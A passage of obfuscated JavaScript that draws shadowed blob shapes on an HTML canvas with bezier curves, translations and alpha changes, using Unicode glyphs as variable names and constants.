				Δ.translate(-3 * ᐃ, -ⲆΔⵠⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 24, ᐃ * 111.25);
				Δ.bezierCurveTo(32 * ᐃ, 115.25 * ᐃ, ᐃ * 29, ᐃ * 123.25, ᐃ * 22, 133.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 15, ᐃ * 140.25, ᐃⵠⲆᐃΔⵠᐃ * ᐃ, 137.25 * ᐃ, ᐃ * 9, 125.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 12, 114.25 * ᐃ, ᐃ * 20, ᐃ * 110.25, ᐃ * 24, 111.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * ᐃᐃⵠⲆᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔΔᐃ];
				Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
				Δ.moveTo(ᐃ * 33, 137.25 * ᐃ);
				Δ.bezierCurveTo(41 * ᐃ, ᐃ * 142.25, ᐃ * 40, ᐃ * 145.25, ᐃ * 35, 147.25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 22, 147.25 * ᐃ, ᐃ * ᐃⲆᐃⲆⲆᐃᐃ, 144.25 * ᐃ, 22 * ᐃ, ᐃ * 138.25);
				Δ.bezierCurveTo(26 * ᐃ, 133.25 * ᐃ, ᐃ * 31, ᐃ * 136.25, 33 * ᐃ, ᐃ * 137.25);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
				Δ.globalAlpha = 1;
				Δ.translate(-ΔΔᐃΔ * ᐃ, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
				Δ.moveTo(33 * ᐃ, ᐃ * 137.25);
				Δ.bezierCurveTo(ᐃ * 41, 142.25 * ᐃ, ᐃ * 40, 145.25 * ᐃ, 35 * ᐃ, ᐃ * 147.25);
				Δ.bezierCurveTo(22 * ᐃ, ᐃ * 147.25, ᐃ * 18, 144.25 * ᐃ, 22 * ᐃ, ᐃ * 138.25);
				Δ.bezierCurveTo(26 * ᐃ, 133.25 * ᐃ, 31 * ᐃ, 136.25 * ᐃ, ᐃ * 33, 137.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ]);
				Δ.globalAlpha = .5;
				Δ.translate(ⵠⵠⵠᐃ * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
				Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
				Δ.moveTo(ᐃ * 36, 187.25 * ᐃ);
				Δ.bezierCurveTo(25 * ᐃ, 198.25 * ᐃ, ᐃ * ΔΔΔΔⲆ, ᐃ * 193.25, ᐃ * 23, 187.25 * ᐃ);
				Δ.bezierCurveTo(26 * ᐃ, 178.25 * ᐃ, ᐃ * 32, 173.25 * ᐃ, 38 * ᐃ, 175.25 * ᐃ);
				Δ.bezierCurveTo(44 * ᐃ, ᐃ * 180.25, 39 * ᐃ, 186.25 * ᐃ, 36 * ᐃ, 187.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -ⲆᐃΔᐃ, -ᐃⵠⲆΔᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(36 * ᐃ, ᐃ * 187.25);
				Δ.bezierCurveTo(ᐃ * 25, 198.25 * ᐃ, 19 * ᐃ, ᐃ * 193.25, ᐃ * 23, ᐃ * 187.25);
				Δ.bezierCurveTo(ᐃ * 26, ᐃ * 178.25, 32 * ᐃ, 173.25 * ᐃ, ᐃ * 38, ᐃ * 175.25);
				Δ.bezierCurveTo(44 * ᐃ, ᐃ * 180.25, ᐃ * 39, ᐃ * 186.25, ᐃ * 36, 187.25 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1])
			} else if (ⵠᐃ == ΔⵠⲆΔ) {
				Ⲇⵠ.width = 543 * ᐃ;
				Ⲇⵠ.height = 470 * ᐃ;
				Δ.globalAlpha = .5;
				Δ.translate(ᐃⲆᐃᐃ * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔᐃΔⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 377.1428527832031, ᐃ * 56.87498474121094);
				Δ.bezierCurveTo(384.1428527832031 * ᐃ, ᐃ * 44.87498474121094, ᐃ * 403.1428527832031, ᐃ * 39.87498474121094, 403.1428527832031 * ᐃ, 51.87498474121094 * ᐃ);
				Δ.bezierCurveTo(402.1428527832031 * ᐃ, ᐃ * 59.87498474121094, ᐃ * 396.1428527832031, 61.87498474121094 * ᐃ, ᐃ * 389.1428527832031, ᐃ * 64.87498474121094);
				Δ.bezierCurveTo(376.1428527832031 * ᐃ, ᐃ * 67.87498474121094, ᐃ * 375.1428527832031, ᐃ * 62.87498474121094, 377.1428527832031 * ᐃ, 56.87498474121094 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
				Δ.globalAlpha = ⵠΔΔ;
				Δ.translate(ᐃ * -3, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
				Δ.moveTo(377.1428527832031 * ᐃ, ᐃ * 56.87498474121094);
				Δ.bezierCurveTo(384.1428527832031 * ᐃ, ᐃ * 44.87498474121094, 403.1428527832031 * ᐃ, 39.87498474121094 * ᐃ, ᐃ * 403.1428527832031, ᐃ * 51.87498474121094);
				Δ.bezierCurveTo(ᐃ * 402.1428527832031, ᐃ * 59.87498474121094, 396.1428527832031 * ᐃ, ᐃ * 61.87498474121094, 389.1428527832031 * ᐃ, ᐃ * 64.87498474121094);
				Δ.bezierCurveTo(ᐃ * 376.1428527832031, ᐃ * 67.87498474121094, 375.1428527832031 * ᐃ, 62.87498474121094 * ᐃ, ᐃ * 377.1428527832031, ᐃ * 56.87498474121094);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃⲆΔⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(349.1428527832031 * ᐃ, 44.303558349609375 * ᐃ);
				Δ.bezierCurveTo(358.1428527832031 * ᐃ, ᐃ * 37.303558349609375, ᐃ * 370.1428527832031, ᐃ * 47.303558349609375, ᐃ * 364.1428527832031, 51.303558349609375 * ᐃ);
				Δ.bezierCurveTo(356.1428527832031 * ᐃ, ᐃ * 55.303558349609375, ᐃ * 345.1428527832031, ᐃ * 48.303558349609375, ᐃ * 349.1428527832031, 45.303558349609375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -ᐃⲆΔⵠ, ᐃ * -ᐃⲆΔⵠ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 349.1428527832031, 44.303558349609375 * ᐃ);
				Δ.bezierCurveTo(358.1428527832031 * ᐃ, 37.303558349609375 * ᐃ, ᐃ * 370.1428527832031, 47.303558349609375 * ᐃ, ᐃ * 364.1428527832031, 51.303558349609375 * ᐃ);
				Δ.bezierCurveTo(356.1428527832031 * ᐃ, ᐃ * 55.303558349609375, ᐃ * 345.1428527832031, 48.303558349609375 * ᐃ, 349.1428527832031 * ᐃ, 45.303558349609375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, ᐃ * ᐃⵠⲆΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(480.1428527832031 * ᐃ, ᐃ * 152.30355834960938);
				Δ.bezierCurveTo(ᐃ * 477.1428527832031, 145.30355834960938 * ᐃ, 480.1428527832031 * ᐃ, 140.30355834960938 * ᐃ, 489.1428527832031 * ᐃ, ᐃ * 135.30355834960938);
				Δ.bezierCurveTo(ᐃ * 497.1428527832031, 133.30355834960938 * ᐃ, ᐃ * 498.1428527832031, ᐃ * 140.30355834960938, 491.1428527832031 * ᐃ, 147.30355834960938 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 485.1428527832031, 155.30355834960938 * ᐃ, ᐃ * 482.1428527832031, ᐃ * 156.30355834960938, ᐃ * 480.1428527832031, ᐃ * 152.30355834960938);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -ⵠⵠⵠⵠ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 480.1428527832031, ᐃ * 152.30355834960938);
				Δ.bezierCurveTo(ᐃ * 477.1428527832031, 145.30355834960938 * ᐃ, ᐃ * 480.1428527832031, ᐃ * 140.30355834960938, ᐃ * 489.1428527832031, 135.30355834960938 * ᐃ);
				Δ.bezierCurveTo(497.1428527832031 * ᐃ, ᐃ * 133.30355834960938, ᐃ * 498.1428527832031, 140.30355834960938 * ᐃ, ᐃ * 491.1428527832031, ᐃ * 147.30355834960938);
				Δ.bezierCurveTo(ᐃ * 485.1428527832031, 155.30355834960938 * ᐃ, ᐃ * 482.1428527832031, ᐃ * 156.30355834960938, 480.1428527832031 * ᐃ, 152.30355834960938 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 211.14285278320312, ᐃ * 27.303558349609375);
				Δ.bezierCurveTo(223.14285278320312 * ᐃ, ᐃ * 21.303558349609375, ᐃ * 234.14285278320312, ᐃ * 34.303558349609375, ᐃ * 232.14285278320312, 42.303558349609375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 228.14285278320312, 49.303558349609375 * ᐃ, ᐃ * 223.14285278320312, ᐃ * 45.303558349609375, ᐃ * 213.14285278320312, ᐃ * 38.303558349609375);
				Δ.bezierCurveTo(205.14285278320312 * ᐃ, 31.303558349609375 * ᐃ, ᐃ * 208.14285278320312, 29.303558349609375 * ᐃ, 211.14285278320312 * ᐃ, ᐃ * 27.303558349609375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -ⲆΔⵠⵠ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 211.14285278320312, ᐃ * 27.303558349609375);
				Δ.bezierCurveTo(ᐃ * 223.14285278320312, ᐃ * 21.303558349609375, 234.14285278320312 * ᐃ, ᐃ * 34.303558349609375, 232.14285278320312 * ᐃ, 42.303558349609375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 228.14285278320312, ᐃ * 49.303558349609375, 223.14285278320312 * ᐃ, ᐃ * 45.303558349609375, 213.14285278320312 * ᐃ, ᐃ * 38.303558349609375);
				Δ.bezierCurveTo(205.14285278320312 * ᐃ, 31.303558349609375 * ᐃ, ᐃ * 208.14285278320312, ᐃ * 29.303558349609375, 211.14285278320312 * ᐃ, 27.303558349609375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆⵠ]);
				Δ.globalAlpha = .5;
				Δ.translate(ⵠᐃⵠⲆ * ᐃ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(ᐃ * 364.1428527832031, 73.30355834960938 * ᐃ);
				Δ.bezierCurveTo(354.1428527832031 * ᐃ, ᐃ * 72.30355834960938, 356.1428527832031 * ᐃ, 64.30355834960938 * ᐃ, ᐃ * 359.1428527832031, 59.303558349609375 * ᐃ);
				Δ.bezierCurveTo(365.1428527832031 * ᐃ, ᐃ * 55.303558349609375, ᐃ * 366.1428527832031, 61.303558349609375 * ᐃ, ᐃ * 366.1428527832031, 69.30355834960938 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 365.1428527832031, 73.30355834960938 * ᐃ, 365.1428527832031 * ᐃ, 73.30355834960938 * ᐃ, ᐃ * 364.1428527832031, 73.30355834960938 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(-ΔᐃⲆΔ * ᐃ, ᐃ * -ᐃⵠⲆΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔΔ];
				Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
				Δ.moveTo(364.1428527832031 * ᐃ, ᐃ * 73.30355834960938);
				Δ.bezierCurveTo(354.1428527832031 * ᐃ, ᐃ * 72.30355834960938, ᐃ * 356.1428527832031, ᐃ * 64.30355834960938, ᐃ * 359.1428527832031, 59.303558349609375 * ᐃ);
				Δ.bezierCurveTo(365.1428527832031 * ᐃ, 55.303558349609375 * ᐃ, ᐃ * 366.1428527832031, 61.303558349609375 * ᐃ, 366.1428527832031 * ᐃ, 69.30355834960938 * ᐃ);
				Δ.bezierCurveTo(365.1428527832031 * ᐃ, 73.30355834960938 * ᐃ, 365.1428527832031 * ᐃ, 73.30355834960938 * ᐃ, 364.1428527832031 * ᐃ, 73.30355834960938 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ⵠᐃⵠⲆ * ᐃ, ᐃ * ᐃᐃⲆΔⵠ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
				Δ.moveTo(182.14285278320312 * ᐃ, ᐃ * 57.303558349609375);
				Δ.bezierCurveTo(173.14285278320312 * ᐃ, 52.303558349609375 * ᐃ, ᐃ * 177.14285278320312, 39.303558349609375 * ᐃ, 198.14285278320312 * ᐃ, 36.303558349609375 * ᐃ);
				Δ.bezierCurveTo(209.14285278320312 * ᐃ, ᐃ * 37.303558349609375, 206.14285278320312 * ᐃ, 49.303558349609375 * ᐃ, 193.14285278320312 * ᐃ, ᐃ * 53.303558349609375);
				Δ.bezierCurveTo(ᐃ * 187.14285278320312, 56.303558349609375 * ᐃ, ᐃ * 185.14285278320312, 57.303558349609375 * ᐃ, 182.14285278320312 * ᐃ, 57.303558349609375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ΔΔᐃⵠ;
				Δ.translate(ᐃ * -3, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 182.14285278320312, 57.303558349609375 * ᐃ);
				Δ.bezierCurveTo(173.14285278320312 * ᐃ, ᐃ * 52.303558349609375, ᐃ * 177.14285278320312, ᐃ * 39.303558349609375, 198.14285278320312 * ᐃ, 36.303558349609375 * ᐃ);
				Δ.bezierCurveTo(209.14285278320312 * ᐃ, ᐃ * 37.303558349609375, ᐃ * 206.14285278320312, 49.303558349609375 * ᐃ, 193.14285278320312 * ᐃ, ᐃ * 53.303558349609375);
				Δ.bezierCurveTo(ᐃ * 187.14285278320312, 56.303558349609375 * ᐃ, ᐃ * 185.14285278320312, ᐃ * 57.303558349609375, ᐃ * 182.14285278320312, 57.303558349609375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * ⲆⲆΔⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 489.1428527832031, 267.0178527832031 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 500.1428527832031, 257.0178527832031 * ᐃ, 511.1428527832031 * ᐃ, 269.0178527832031 * ᐃ, ᐃ * 514.1428527832031, ᐃ * 275.0178527832031);
				Δ.bezierCurveTo(ᐃ * 519.1428527832031, ᐃ * 285.0178527832031, ᐃ * 509.1428527832031, 288.0178527832031 * ᐃ, ᐃ * 501.1428527832031, ᐃ * 282.0178527832031);
				Δ.bezierCurveTo(488.1428527832031 * ᐃ, ᐃ * 277.0178527832031, ᐃ * 485.1428527832031, ᐃ * 271.0178527832031, ᐃ * 489.1428527832031, 267.0178527832031 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(-3 * ᐃ, ᐃ * -ᐃᐃⲆΔⵠ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔΔᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(489.1428527832031 * ᐃ, ᐃ * 267.0178527832031);
				Δ.bezierCurveTo(500.1428527832031 * ᐃ, ᐃ * 257.0178527832031, ᐃ * 511.1428527832031, ᐃ * 269.0178527832031, 514.1428527832031 * ᐃ, 275.0178527832031 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 519.1428527832031, ᐃ * 285.0178527832031, ᐃ * 509.1428527832031, ᐃ * 288.0178527832031, ᐃ * 501.1428527832031, 282.0178527832031 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 488.1428527832031, 277.0178527832031 * ᐃ, 485.1428527832031 * ᐃ, 271.0178527832031 * ᐃ, ᐃ * 489.1428527832031, ᐃ * 267.0178527832031);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ΔⲆᐃⲆ * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
				Δ.lineJoin = ⵠ[ΔⲆΔΔ];
				Δ.moveTo(480.1428527832031 * ᐃ, 122.73213958740234 * ᐃ);
				Δ.bezierCurveTo(469.1428527832031 * ᐃ, ᐃ * 119.73213958740234, ᐃ * 473.1428527832031, ᐃ * 108.73213958740234, 476.1428527832031 * ᐃ, 107.73213958740234 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 483.1428527832031, 102.73213958740234 * ᐃ, ᐃ * 485.1428527832031, ᐃ * 118.73213958740234, ᐃ * 480.1428527832031, 122.73213958740234 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -ᐃⵠⲆΔᐃ, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 480.1428527832031, 122.73213958740234 * ᐃ);
				Δ.bezierCurveTo(469.1428527832031 * ᐃ, 119.73213958740234 * ᐃ, ᐃ * 473.1428527832031, 108.73213958740234 * ᐃ, 476.1428527832031 * ᐃ, ᐃ * 107.73213958740234);
				Δ.bezierCurveTo(483.1428527832031 * ᐃ, ᐃ * 102.73213958740234, ᐃ * 485.1428527832031, 118.73213958740234 * ᐃ, ᐃ * 480.1428527832031, ᐃ * 122.73213958740234);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * ΔΔⵠΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔⲆΔΔ];
				Δ.moveTo(ᐃ * 470.1428527832031, ᐃ * 286.3035697937012);
				Δ.bezierCurveTo(472.1428527832031 * ᐃ, ᐃ * 277.3035697937012, 480.1428527832031 * ᐃ, ᐃ * 277.3035697937012, ᐃ * 489.1428527832031, 286.3035697937012 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 490.1428527832031, ᐃ * 292.3035697937012, 482.1428527832031 * ᐃ, 294.3035697937012 * ᐃ, 470.1428527832031 * ᐃ, 286.3035697937012 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(-3 * ᐃ, -ΔⲆΔᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 470.1428527832031, 286.3035697937012 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 472.1428527832031, 277.3035697937012 * ᐃ, 480.1428527832031 * ᐃ, 277.3035697937012 * ᐃ, ᐃ * 489.1428527832031, 286.3035697937012 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 490.1428527832031, 292.3035697937012 * ᐃ, 482.1428527832031 * ᐃ, 294.3035697937012 * ᐃ, ᐃ * 470.1428527832031, 286.3035697937012 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ⵠᐃⵠⲆ * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(518.1428527832031 * ᐃ, ᐃ * 265.0178565979004);
				Δ.bezierCurveTo(ᐃ * 524.1428527832031, ᐃ * 262.0178565979004, ᐃ * 521.1428527832031, 247.0178565979004 * ᐃ, ᐃ * 514.1428527832031, 250.0178565979004 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 510.1428527832031, ᐃ * 252.0178565979004, ᐃ * 509.1428527832031, ᐃ * 266.0178565979004, ᐃ * 518.1428527832031, 266.0178565979004 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ]);
				Δ.globalAlpha = 1;
				Δ.translate(-3 * ᐃ, ᐃ * -ᐃⵠⲆΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔΔᐃⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 518.1428527832031, 265.0178565979004 * ᐃ);
				Δ.bezierCurveTo(524.1428527832031 * ᐃ, 262.0178565979004 * ᐃ, 521.1428527832031 * ᐃ, 247.0178565979004 * ᐃ, 514.1428527832031 * ᐃ, 250.0178565979004 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 510.1428527832031, 252.0178565979004 * ᐃ, 509.1428527832031 * ᐃ, 266.0178565979004 * ᐃ, 518.1428527832031 * ᐃ, ᐃ * 266.0178565979004);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆΔ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * ΔⲆΔᐃ, ᐃⵠⲆΔᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 179.14285278320312, ᐃ * 399.5892858505249);
				Δ.bezierCurveTo(174.14285278320312 * ᐃ, 385.5892858505249 * ᐃ, 186.14285278320312 * ᐃ, ᐃ * 379.5892858505249, ᐃ * 198.14285278320312, 379.5892858505249 * ᐃ);
				Δ.bezierCurveTo(208.14285278320312 * ᐃ, 379.5892858505249 * ᐃ, ᐃ * 206.14285278320312, ᐃ * 391.5892858505249, ᐃ * 194.14285278320312, ᐃ * 396.5892858505249);
				Δ.bezierCurveTo(184.14285278320312 * ᐃ, 401.5892858505249 * ᐃ, ᐃ * 182.14285278320312, ᐃ * 402.5892858505249, ᐃ * 179.14285278320312, ᐃ * 399.5892858505249);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(-3 * ᐃ, ᐃ * -ⵠᐃⵠⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
				Δ.moveTo(179.14285278320312 * ᐃ, ᐃ * 399.5892858505249);
				Δ.bezierCurveTo(ᐃ * 174.14285278320312, ᐃ * 385.5892858505249, 186.14285278320312 * ᐃ, 379.5892858505249 * ᐃ, 198.14285278320312 * ᐃ, ᐃ * 379.5892858505249);
				Δ.bezierCurveTo(208.14285278320312 * ᐃ, ᐃ * 379.5892858505249, 206.14285278320312 * ᐃ, ᐃ * 391.5892858505249, 194.14285278320312 * ᐃ, 396.5892858505249 * ᐃ);
				Δ.bezierCurveTo(184.14285278320312 * ᐃ, 401.5892858505249 * ᐃ, ᐃ * 182.14285278320312, 402.5892858505249 * ᐃ, 179.14285278320312 * ᐃ, ᐃ * 399.5892858505249);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔᐃᐃⲆ]);
				Δ.globalAlpha = .5;
				Δ.translate(ⲆΔⵠⵠ * ᐃ, ⵠⵠⵠⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔΔᐃⲆ];
				Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
				Δ.moveTo(163.14285278320312 * ᐃ, ᐃ * 407.875);
				Δ.bezierCurveTo(152.14285278320312 * ᐃ, ᐃ * 405.875, ᐃ * 156.14285278320312, 391.875 * ᐃ, ᐃ * 163.14285278320312, ᐃ * 385.875);
				Δ.bezierCurveTo(170.14285278320312 * ᐃ, ᐃ * 381.875, 173.14285278320312 * ᐃ, 385.875 * ᐃ, ᐃ * 170.14285278320312, ᐃ * 398.875);
				Δ.bezierCurveTo(169.14285278320312 * ᐃ, ᐃ * 403.875, ᐃ * 165.14285278320312, ᐃ * 408.875, ᐃ * 164.14285278320312, ᐃ * 407.875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ΔΔᐃⵠ;
				Δ.translate(-ΔⲆΔᐃ * ᐃ, -ⵠⵠⵠᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃΔΔΔ];
				Δ.moveTo(ᐃ * 163.14285278320312, 407.875 * ᐃ);
				Δ.bezierCurveTo(152.14285278320312 * ᐃ, 405.875 * ᐃ, ᐃ * 156.14285278320312, ᐃ * 391.875, 163.14285278320312 * ᐃ, 385.875 * ᐃ);
				Δ.bezierCurveTo(170.14285278320312 * ᐃ, 381.875 * ᐃ, ᐃ * 173.14285278320312, ᐃ * 385.875, 170.14285278320312 * ᐃ, 398.875 * ᐃ);
				Δ.bezierCurveTo(169.14285278320312 * ᐃ, ᐃ * 403.875, 165.14285278320312 * ᐃ, ᐃ * 408.875, ᐃ * 164.14285278320312, ᐃ * 407.875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⲆⲆ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, ᐃ * ΔᐃⲆΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(78.14285278320312 * ᐃ, 71.73211669921875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 82.14285278320312, 62.73211669921875 * ᐃ, 88.14285278320312 * ᐃ, 69.73211669921875 * ᐃ, ᐃ * 91.14285278320312, ᐃ * 79.73211669921875);
				Δ.bezierCurveTo(ᐃ * 90.14285278320312, ᐃ * 86.73211669921875, ᐃ * 79.14285278320312, 83.73211669921875 * ᐃ, ᐃ * 78.14285278320312, 71.73211669921875 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃᐃ]);
				Δ.globalAlpha = ᐃⲆᐃ;
				Δ.translate(ᐃ * -ⲆΔⵠⵠ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(78.14285278320312 * ᐃ, ᐃ * 71.73211669921875);
				Δ.bezierCurveTo(ᐃ * 82.14285278320312, ᐃ * 62.73211669921875, ᐃ * 88.14285278320312, 69.73211669921875 * ᐃ, ᐃ * 91.14285278320312, 79.73211669921875 * ᐃ);
				Δ.bezierCurveTo(90.14285278320312 * ᐃ, ᐃ * 86.73211669921875, ᐃ * 79.14285278320312, ᐃ * 83.73211669921875, 78.14285278320312 * ᐃ, 71.73211669921875 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃⲆᐃᐃ * ᐃ, ᐃ * ᐃⲆᐃᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⲆΔΔ];
				Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
				Δ.moveTo(385.1428527832031 * ᐃ, 405.017858505249 * ᐃ);
